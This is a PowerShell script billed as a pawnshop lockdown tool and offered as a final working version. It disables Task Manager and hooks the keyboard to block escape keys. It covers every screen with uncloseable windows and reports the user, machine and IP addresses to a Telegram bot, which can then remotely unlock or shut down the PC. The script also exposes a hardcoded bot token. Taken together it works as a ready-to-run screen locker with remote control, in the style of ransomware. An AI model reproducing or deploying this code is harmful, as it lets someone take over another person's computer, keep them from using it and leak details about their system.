# Pawnshop Lockdown Script (FINAL WORKING VERSION - IEX Compatible)

# --- Configuration ---
$ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$ChatID    = "656189986"
$Username  = [Environment]::UserName
$Computer  = [Environment]::MachineName
$LockFile  = "C:\lock_status.txt"

# Mark locked by default
"locked" | Out-File $LockFile -Force

# Disable Task Manager
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "DisableTaskMgr" -Value 1 -Type DWord -Force

# Load assemblies
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Keyboard Hook (Block Alt, Ctrl+Alt+Del, Alt+F4 etc.)
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hook = IntPtr.Zero;
    private delegate IntPtr HookProc(int n, IntPtr wp, IntPtr lp);
    private static HookProc proc = HookCallback;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc proc, IntPtr h, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    public static void Start() { hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0); }
    public static void Stop() { UnhookWindowsHookEx(hook); }
    private static IntPtr HookCallback(int n, IntPtr wp, IntPtr lp) {
        if (n >= 0 && (wp == (IntPtr)WM_KEYDOWN || wp == (IntPtr)WM_SYSKEYDOWN)) {
            Keys key = (Keys)Marshal.ReadInt32(lp);
            bool alt = Control.ModifierKeys.HasFlag(Keys.Alt);
            bool ctrl = Control.ModifierKeys.HasFlag(Keys.Control);
            if (alt || key == Keys.LWin || key == Keys.RWin || (ctrl && key == Keys.Escape))
                return (IntPtr)1;
        }
        return CallNextHookEx(hook, n, wp, lp);
    }
}
"@
[KeyHook]::Start()

# Download image
try {
    $web = New-Object Net.WebClient
    $image = [Drawing.Image]::FromStream([IO.MemoryStream]($web.DownloadData($ImageUrl)))
} catch {
    $bmp = New-Object Drawing.Bitmap(1920,1080)
    $gfx = [Drawing.Graphics]::FromImage($bmp)
    $gfx.Clear([Drawing.Color]::Black)
    $image = $bmp
}

# Create forms for all screens
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true;
        Bounds = $screen.Bounds; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = $image; Dock = 'Fill'; SizeMode = 'Zoom'
    }
    $form.Add_FormClosing({ if (-not $script:unlock) { $_.Cancel = $true } })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# Telegram Notify
$ipLocal = (Get-NetIPAddress -AF IPv4 | ?{$_.IPAddress -notmatch '^127|169'}).IPAddress
$ipPublic = (Invoke-RestMethod 'https://api.ipify.org') -as [string]
$msg = "PC Locked: $Username ($Computer)`nIP: $ipLocal | $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username"
Invoke-RestMethod "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body (@{chat_id=$ChatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'

# Telegram listener
$offset=0
$timer = New-Object Windows.Forms.Timer -Property @{Interval=4000}
$timer.Add_Tick({
    try {
        $resp=Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset"
        foreach($update in $resp.result){
            $offset=$update.update_id+1
            $txt=$update.message.text
            if($txt -match "^/unlock$Username$"){ 
                "unlocked"|Out-File $LockFile -Force
                $script:unlock=$true
                [Windows.Forms.Application]::Exit()
            }elseif($txt -match "^/shutdown$Username$"){ 
                Stop-Computer -Force
            }elseif($txt -match "^/lock$Username$"){ 
                "locked"|Out-File $LockFile -Force
            }
        }
    }catch{}
})
$timer.Start()

# Start application loop
[Windows.Forms.Application]::Run()

# Cleanup after exit
$timer.Stop()
[KeyHook]::Stop()
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
